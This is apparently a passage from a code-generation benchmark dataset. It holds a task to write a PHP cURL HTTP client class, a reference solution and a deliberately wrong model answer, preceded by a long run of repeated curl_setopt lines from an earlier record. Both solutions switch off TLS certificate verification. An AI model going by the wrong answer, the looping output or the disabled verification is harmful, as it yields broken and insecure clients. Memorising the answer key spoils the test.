curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Create a PHP class for handling HTTP requests using cURL with support for various HTTP methods, streaming, authentication, and proxy configuration.\n\nClass Description: BCS_RequestCore is a comprehensive HTTP client class that provides a flexible interface for making HTTP requests using PHP's cURL extension. It supports all major HTTP methods (GET, POST, PUT, DELETE, HEAD), handles authentication, proxy configuration, streaming uploads/downloads, and provides detailed response information.\n\nAttributes:\n\nrequest_url: [string] - The URL to send the request to\nrequest_headers: [array] - Associative array of request headers\nrequest_body: [string] - The request body content\nresponse: [string] - The complete response from the server\nresponse_headers: [array] - Parsed response headers\nresponse_body: [string] - The response body content\nresponse_code: [int] - HTTP response status code\nresponse_info: [array] - Additional response information from cURL\ncurl_handle: [resource] - The cURL handle resource\nmethod: [string] - HTTP method (GET, POST, PUT, DELETE, HEAD)\nproxy: [array|null] - Proxy configuration details\nusername: [string|null] - Username for authentication\npassword: [string|null] - Password for authentication\ncurlopts: [array|null] - Additional cURL options\ndebug_mode: [bool] - Whether to enable debug mode\nrequest_class: [string] - Class name for request handling\nresponse_class: [string] - Class name for response handling\nuseragent: [string] - User agent string\nread_file: [string|null] - File path for streaming upload\nread_stream: [resource|null] - Stream resource for reading\nread_stream_size: [int|null] - Size of the read stream\nread_stream_read: [int] - Bytes read from the stream\nwrite_file: [string|null] - File path for streaming download\nwrite_stream: [resource|null] - Stream resource for writing\nseek_position: [int|null] - Position to seek in the read stream\nregistered_streaming_read_callback: [callable|null] - Callback for streaming read\nregistered_streaming_write_callback: [callable|null] - Callback for streaming write\n\nMethods:\n\n__construct([string|null] $url, [array|null] $proxy, [array|null] $helpers) -> [self] - Initializes the request object with optional URL, proxy, and helper classes\n__destruct() -> [self] - Cleans up any open file handles\nset_credentials([string] $user, [string] $pass) -> [self] - Sets authentication credentials\nadd_header([string] $key, [string] $value) -> [self] - Adds a request header\nremove_header([string] $key) -> [self] - Removes a request header\nset_method([string] $method) -> [self] - Sets the HTTP method\nset_useragent([string] $ua) -> [self] - Sets the user agent string\nset_body([string] $body) -> [self] - Sets the request body\nset_request_url([string] $url) -> [self] - Sets the request URL\nset_curlopts([array] $curlopts) -> [self] - Sets additional cURL options\nset_read_stream_size([int] $size) -> [self] - Sets the read stream size\nset_read_stream([resource] $resource, [int|null] $size) -> [self] - Sets the read stream resource\nset_read_file([string] $location) -> [self] - Sets a file to read from\nset_write_stream([resource] $resource) -> [self] - Sets the write stream resource\nset_write_file([string] $location) -> [self] - Sets a file to write to\nset_proxy([string] $proxy) -> [self] - Configures proxy settings\nset_seek_position([int|null] $position) -> [self] - Sets the seek position for read stream\nregister_streaming_read_callback([callable] $callback) -> [self] - Registers a streaming read callback\nregister_streaming_write_callback([callable] $callback) -> [self] - Registers a streaming write callback\nstreaming_read_callback([resource] $curl_handle, [resource] $file_handle, [int] $length) -> [string] - Callback for reading from stream\nstreaming_write_callback([resource] $curl_handle, [string] $data) -> [int] - Callback for writing to stream\nprep_request() -> [resource] - Prepares and returns a cURL handle\nprocess_response([resource|null] $curl_handle, [string|null] $response) -> [mixed] - Processes the cURL response\nsend_request([bool] $parse) -> [mixed] - Sends the request and returns response\nisBaeEnv() -> [bool] - Checks if running in Baidu App Engine environment\nget_response_header([string|null] $header) -> [mixed] - Gets response header(s)\nget_response_body() -> [string] - Gets the response body\nget_response_code() -> [int] - Gets the response status code",
    "Canonical_solution": "namespace Think\\Upload\\Driver\\Bcs;\n\nclass BCS_RequestCore\n{\n    public $request_url;\n    public $request_headers;\n    public $request_body;\n    public $response;\n    public $response_headers;\n    public $response_body;\n    public $response_code;\n    public $response_info;\n    public $curl_handle;\n    public $method;\n    public $proxy = null;\n    public $username = null;\n    public $password = null;\n    public $curlopts = null;\n    public $debug_mode = false;\n    public $request_class = 'BCS_RequestCore';\n    public $response_class = 'BCS_ResponseCore';\n    public $useragent = 'BCS_RequestCore/1.4.2';\n    public $read_file = null;\n    public $read_stream = null;\n    public $read_stream_size = null;\n    public $read_stream_read = 0;\n    public $write_file = null;\n    public $write_stream = null;\n    public $seek_position = null;\n    public $registered_streaming_read_callback = null;\n    public $registered_streaming_write_callback = null;\n\n    const HTTP_GET = 'GET';\n    const HTTP_POST = 'POST';\n    const HTTP_PUT = 'PUT';\n    const HTTP_DELETE = 'DELETE';\n    const HTTP_HEAD = 'HEAD';\n\n    public function __construct($url = null, $proxy = null, $helpers = null)\n    {\n        $this->request_url = $url;\n        $this->method = self::HTTP_GET;\n        $this->request_headers = array();\n        $this->request_body = '';\n\n        if (isset($helpers['request']) && !empty($helpers['request'])) {\n            $this->request_class = $helpers['request'];\n        }\n\n        if (isset($helpers['response']) && !empty($helpers['response'])) {\n            $this->response_class = $helpers['response'];\n        }\n\n        if ($proxy) {\n            $this->set_proxy($proxy);\n        }\n\n        return $this;\n    }\n\n    public function __destruct()\n    {\n        if (isset($this->read_file) && isset($this->read_stream)) {\n            fclose($this->read_stream);\n        }\n        if (isset($this->write_file) && isset($this->write_stream)) {\n            fclose($this->write_stream);\n        }\n        return $this;\n    }\n\n    public function set_credentials($user, $pass)\n    {\n        $this->username = $user;\n        $this->password = $pass;\n        return $this;\n    }\n\n    public function add_header($key, $value)\n    {\n        $this->request_headers[$key] = $value;\n        return $this;\n    }\n\n    public function remove_header($key)\n    {\n        if (isset($this->request_headers[$key])) {\n            unset($this->request_headers[$key]);\n        }\n        return $this;\n    }\n\n    public function set_method($method)\n    {\n        $this->method = strtoupper($method);\n        return $this;\n    }\n\n    public function set_useragent($ua)\n    {\n        $this->useragent = $ua;\n        return $this;\n    }\n\n    public function set_body($body)\n    {\n        $this->request_body = $body;\n        return $this;\n    }\n\n    public function set_request_url($url)\n    {\n        $this->request_url = $url;\n        return $this;\n    }\n\n    public function set_curlopts($curlopts)\n    {\n        $this->curlopts = $curlopts;\n        return $this;\n    }\n\n    public function set_read_stream_size($size)\n    {\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function set_read_stream($resource, $size = null)\n    {\n        if (!isset($size) || $size < 0) {\n            $stats = fstat($resource);\n            if ($stats && $stats['size'] >= 0) {\n                $position = ftell($resource);\n                if ($position !== false && $position >= 0) {\n                    $size = $stats['size'] - $position;\n                }\n            }\n        }\n        $this->read_stream = $resource;\n        return $this->set_read_stream_size($size);\n    }\n\n    public function set_read_file($location)\n    {\n        $this->read_file = $location;\n        $read_file_handle = fopen($location, 'r');\n        return $this->set_read_stream($read_file_handle);\n    }\n\n    public function set_write_stream($resource)\n    {\n        $this->write_stream = $resource;\n        return $this;\n    }\n\n    public function set_write_file($location)\n    {\n        $this->write_file = $location;\n        $write_file_handle = fopen($location, 'w');\n        return $this->set_write_stream($write_file_handle);\n    }\n\n    public function set_proxy($proxy)\n    {\n        $proxy = parse_url($proxy);\n        $proxy['user'] = isset($proxy['user']) ? $proxy['user'] : null;\n        $proxy['pass'] = isset($proxy['pass']) ? $proxy['pass'] : null;\n        $proxy['port'] = isset($proxy['port']) ? $proxy['port'] : null;\n        $this->proxy = $proxy;\n        return $this;\n    }\n\n    public function set_seek_position($position)\n    {\n        $this->seek_position = isset($position) ? (integer) $position : null;\n        return $this;\n    }\n\n    public function register_streaming_read_callback($callback)\n    {\n        $this->registered_streaming_read_callback = $callback;\n        return $this;\n    }\n\n    public function register_streaming_write_callback($callback)\n    {\n        $this->registered_streaming_write_callback = $callback;\n        return $this;\n    }\n\n    public function streaming_read_callback($curl_handle, $file_handle, $length)\n    {\n        if ($this->read_stream_read >= $this->read_stream_size) {\n            return '';\n        }\n\n        if ($this->read_stream_read == 0 && isset($this->seek_position) && $this->seek_position !== ftell($this->read_stream)) {\n            if (fseek($this->read_stream, $this->seek_position) !== 0) {\n                throw new BCS_RequestCore_Exception('The stream does not support seeking and is either not at the requested position or the position is unknown.');\n            }\n        }\n\n        $read = fread($this->read_stream, min($this->read_stream_size - $this->read_stream_read, $length));\n        $this->read_stream_read += strlen($read);\n        $out = $read === false ? '' : $read;\n\n        if ($this->registered_streaming_read_callback) {\n            call_user_func($this->registered_streaming_read_callback, $curl_handle, $file_handle, $out);\n        }\n\n        return $out;\n    }\n\n    public function streaming_write_callback($curl_handle, $data)\n    {\n        $length = strlen($data);\n        $written_total = 0;\n        $written_last = 0;\n\n        while ($written_total < $length) {\n            $written_last = fwrite($this->write_stream, substr($data, $written_total));\n            if ($written_last === false) {\n                return $written_total;\n            }\n            $written_total += $written_last;\n        }\n\n        if ($this->registered_streaming_write_callback) {\n            call_user_func($this->registered_streaming_write_callback, $curl_handle, $written_total);\n        }\n\n        return $written_total;\n    }\n\n    public function prep_request()\n    {\n        $curl_handle = curl_init();\n        curl_setopt($curl_handle, CURLOPT_URL, $this->request_url);\n        curl_setopt($curl_handle, CURLOPT_FILETIME, true);\n        curl_setopt($curl_handle, CURLOPT_FRESH_CONNECT, false);\n        curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($curl_handle, CURLOPT_SSL_VERIFYHOST, true);\n        curl_setopt($curl_handle, CURLOPT_CLOSEPOLICY, CURLCLOSEPOLICY_LEAST_RECENTLY_USED);\n        curl_setopt($curl_handle, CURLOPT_MAXREDIRS, 5);\n        curl_setopt($curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($curl_handle, CURLOPT_TIMEOUT, 5184000);\n        curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, 120);\n        curl_setopt($curl_handle, CURLOPT_NOSIGNAL, true);\n        curl_setopt($curl_handle, CURLOPT_REFERER, $this->request_url);\n        curl_setopt($curl_handle, CURLOPT_USERAGENT, $this->useragent);\n        curl_setopt($curl_handle, CURLOPT_READFUNCTION, array($this, 'streaming_read_callback'));\n\n        if ($this->debug_mode) {\n            curl_setopt($curl_handle, CURLOPT_VERBOSE, true);\n        }\n\n        if ($this->proxy) {\n            curl_setopt($curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n            $host = $this->proxy['host'];\n            $host .= ($this->proxy['port']) ? ':' . $this->proxy['port'] : '';\n            curl_setopt($curl_handle, CURLOPT_PROXY, $host);\n            if (isset($this->proxy['user']) && isset($this->proxy['pass'])) {\n                curl_setopt($curl_handle, CURLOPT_PROXYUSERPWD, $this->proxy['user'] . ':' . $this->proxy['pass']);\n            }\n        }\n\n        if ($this->username && $this->password) {\n            curl_setopt($curl_handle, CURLOPT_HTTPAUTH, CURLAUTH_ANY);\n            curl_setopt($curl_handle, CURLOPT_USERPWD, $this->username . ':' . $this->password);\n        }\n\n        if (extension_loaded('zlib')) {\n            curl_setopt($curl_handle, CURLOPT_ENCODING, '');\n        }\n\n        if (isset($this->request_headers) && count($this->request_headers)) {\n            $temp_headers = array();\n            foreach ($this->request_headers as $k => $v) {\n                $temp_headers[] = $k . ': ' . $v;\n            }\n            curl_setopt($curl_handle, CURLOPT_HTTPHEADER, $temp_headers);\n        }\n\n        switch ($this->method) {\n            case self::HTTP_PUT:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, 'PUT');\n                if (isset($this->read_stream)) {\n                    if (!isset($this->read_stream_size) || $this->read_stream_size < 0) {\n                        throw new BCS_RequestCore_Exception('The stream size for the streaming upload cannot be determined.');\n                    }\n                    curl_setopt($curl_handle, CURLOPT_INFILESIZE, $this->read_stream_size);\n                    curl_setopt($curl_handle, CURLOPT_UPLOAD, true);\n                } else {\n                    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                }\n                break;\n            case self::HTTP_POST:\n                curl_setopt($curl_handle, CURLOPT_POST, true);\n                curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                break;\n            case self::HTTP_HEAD:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, self::HTTP_HEAD);\n                curl_setopt($curl_handle, CURLOPT_NOBODY, 1);\n                break;\n            default:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, $this->method);\n                if (isset($this->write_stream)) {\n                    curl_setopt($curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'streaming_write_callback'));\n                    curl_setopt($curl_handle, CURLOPT_HEADER, false);\n                } else {\n                    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                }\n                break;\n        }\n\n        if (isset($this->curlopts) && sizeof($this->curlopts) > 0) {\n            foreach ($this->curlopts as $k => $v) {\n                curl_setopt($curl_handle, $k, $v);\n            }\n        }\n\n        return $curl_handle;\n    }\n\n    public function process_response($curl_handle = null, $response = null)\n    {\n        if ($curl_handle && $response) {\n            $this->curl_handle = $curl_handle;\n            $this->response = $response;\n        }\n\n        if (is_resource($this->curl_handle)) {\n            $header_size = curl_getinfo($this->curl_handle, CURLINFO_HEADER_SIZE);\n            $this->response_headers = substr($this->response, 0, $header_size);\n            $this->response_body = substr($this->response, $header_size);\n            $this->response_code = curl_getinfo($this->curl_handle, CURLINFO_HTTP_CODE);\n            $this->response_info = curl_getinfo($this->curl_handle);\n\n            $this->response_headers = explode(\"\\r\\n\\r\\n\", trim($this->response_headers));\n            $this->response_headers = array_pop($this->response_headers);\n            $this->response_headers = explode(\"\\r\\n\", $this->response_headers);\n            array_shift($this->response_headers);\n\n            $header_assoc = array();\n            foreach ($this->response_headers as $header) {\n                $kv = explode(': ', $header);\n                $header_assoc[$kv[0]] = $kv[1];\n            }\n\n            $this->response_headers = $header_assoc;\n            $this->response_headers['_info'] = $this->response_info;\n            $this->response_headers['_info']['method'] = $this->method;\n\n            if ($curl_handle && $response) {\n                $class = '\\Think\\Upload\\Driver\\Bcs\\\\' . $this->response_class;\n                return new $class($this->response_headers, $this->response_body, $this->response_code, $this->curl_handle);\n            }\n        }\n\n        return false;\n    }\n\n    public function send_request($parse = false)\n    {\n        if (false === $this->isBaeEnv()) {\n            set_time_limit(0);\n        }\n\n        $curl_handle = $this->prep_request();\n        $this->response = curl_exec($curl_handle);\n\n        if ($this->response === false ||\n            ($this->method === self::HTTP_GET &&\n             curl_errno($curl_handle) === CURLE_PARTIAL_FILE)) {\n            throw new BCS_RequestCore_Exception('cURL resource: ' . (string) $curl_handle . '; cURL error: ' . curl_error($curl_handle) . ' (' . curl_errno($curl_handle) . ')');\n        }\n\n        $parsed_response = $this->process_response($curl_handle, $this->response);\n        curl_close($curl_handle);\n\n        if ($parse) {\n            return $parsed_response;\n        }\n\n        return $this->response;\n    }\n\n    private function isBaeEnv()\n    {\n        if (isset($_SERVER['HTTP_HOST'])) {\n            $host = $_SERVER['HTTP_HOST'];\n            $pos = strpos($host, '.');\n            if ($pos !== false) {\n                $substr = substr($host, $pos + 1);\n                if ($substr == 'duapp.com') {\n                    return true;\n                }\n            }\n        }\n        if (isset($_SERVER[\"HTTP_BAE_LOGID\"])) {\n            return true;\n        }\n\n        return false;\n    }\n\n    public function get_response_header($header = null)\n    {\n        if ($header) {\n            return $this->response_headers[$header];\n        }\n        return $this->response_headers;\n    }\n\n    public function get_response_body()\n    {\n        return $this->response_body;\n    }\n\n    public function get_response_code()\n    {\n        return $this->response_code;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\nclass BCS_RequestCore {\n    protected $request_url;\n    protected $request_headers;\n    protected $request_body;\n    protected $response;\n    protected $response_headers;\n    protected $response_body;\n    protected $response_code;\n    protected $response_info;\n    protected $curl_handle;\n    protected $method;\n    protected $proxy;\n    protected $username;\n    protected $password;\n    protected $curlopts;\n    protected $debug_mode;\n    protected $request_class;\n    protected $response_class;\n    protected $useragent;\n    protected $read_file;\n    protected $read_stream;\n    protected $read_stream_size;\n    protected $read_stream_read;\n    protected $write_file;\n    protected $write_stream;\n    protected $seek_position;\n    protected $registered_streaming_read_callback;\n    protected $registered_streaming_write_callback;\n\n    public function __construct($url = null, $proxy = null, $helpers = null) {\n        $this->request_url = $url;\n        $this->request_headers = array();\n        $this->request_body = '';\n        $this->response = '';\n        $this->response_headers = array();\n        $this->response_body = '';\n        $this->response_code = 0;\n        $this->response_info = array();\n        $this->curl_handle = null;\n        $this->method = 'GET';\n        $this->proxy = $proxy;\n        $this->username = null;\n        $this->password = null;\n        $this->curlopts = null;\n        $this->debug_mode = false;\n        $this->request_class = 'BCS_Request';\n        $this->response_class = 'BCS_Response';\n        $this->useragent = 'BCS PHP SDK';\n        $this->read_file = null;\n        $this->read_stream = null;\n        $this->read_stream_size = null;\n        $this->read_stream_read = 0;\n        $this->write_file = null;\n        $this->write_stream = null;\n        $this->seek_position = null;\n        $this->registered_streaming_read_callback = null;\n        $this->registered_streaming_write_callback = null;\n    }\n\n    public function __destruct() {\n        if (is_resource($this->read_stream)) {\n            fclose($this->read_stream);\n        }\n        if (is_resource($this->write_stream)) {\n            fclose($this->write_stream);\n        }\n    }\n\n    public function set_credentials($user, $pass) {\n        $this->username = $user;\n        $this->password = $pass;\n        return $this;\n    }\n\n    public function add_header($key, $value) {\n        $this->request_headers[$key] = $value;\n        return $this;\n    }\n\n    public function remove_header($key) {\n        unset($this->request_headers[$key]);\n        return $this;\n    }\n\n    public function set_method($method) {\n        $this->method = strtoupper($method);\n        return $this;\n    }\n\n    public function set_useragent($ua) {\n        $this->useragent = $ua;\n        return $this;\n    }\n\n    public function set_body($body) {\n        $this->request_body = $body;\n        return $this;\n    }\n\n    public function set_request_url($url) {\n        $this->request_url = $url;\n        return $this;\n    }\n\n    public function set_curlopts($curlopts) {\n        $this->curlopts = $curlopts;\n        return $this;\n    }\n\n    public function set_read_stream_size($size) {\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function set_read_stream($resource, $size = null) {\n        $this->read_stream = $resource;\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function set_read_file($location) {\n        $this->read_file = $location;\n        return $this;\n    }\n\n    public function set_write_stream($resource) {\n        $this->write_stream = $resource;\n        return $this;\n    }\n\n    public function set_write_file($location) {\n        $this->write_file = $location;\n        return $this;\n    }\n\n    public function set_proxy($proxy) {\n        $this->proxy = $proxy;\n        return $this;\n    }\n\n    public function set_seek_position($position) {\n        $this->seek_position = $position;\n        return $this;\n    }\n\n    public function register_streaming_read_callback($callback) {\n        $this->registered_streaming_read_callback = $callback;\n        return $this;\n    }\n\n    public function register_streaming_write_callback($callback) {\n        $this->registered_streaming_write_callback = $callback;\n        return $this;\n    }\n\n    protected function streaming_read_callback($curl_handle, $file_handle, $length) {\n        if ($this->registered_streaming_read_callback) {\n            return call_user_func($this->registered_streaming_read_callback, $curl_handle, $file_handle, $length);\n        }\n        return fread($this->read_stream, $length);\n    }\n\n    protected function streaming_write_callback($curl_handle, $data) {\n        if ($this->registered_streaming_write_callback) {\n            return call_user_func($this->registered_streaming_write_callback, $curl_handle, $data);\n        }\n        return fwrite($this->write_stream, $data);\n    }\n\n    protected function prep_request() {\n        $this->curl_handle = curl_init();\n        curl_setopt($this->curl_handle, CURLOPT_URL, $this->request_url);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER, $this->request_headers);\n        curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($this->curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($this->curl_handle, CURLOPT_USERAGENT, $this->useragent);\n        curl_setopt($this->curl_handle, CURLOPT_CUSTOMREQUEST, $this->method);\n        curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n        curl_setopt($this->curl_handle, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);\n        curl_setopt($this->curl_handle, CURLOPT_USERPWD, $this->username . ':' . $this->password);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYUSERPWD, $this->proxy['username'] . ':' . $this->proxy['password']);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYTYPE, $this->proxy['type']);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYPORT, $this->proxy['port']);\n        curl_setopt($this->curl_handle, CURLOPT_PROXYAUTH, $this->proxy['auth']);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_PROXY_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, 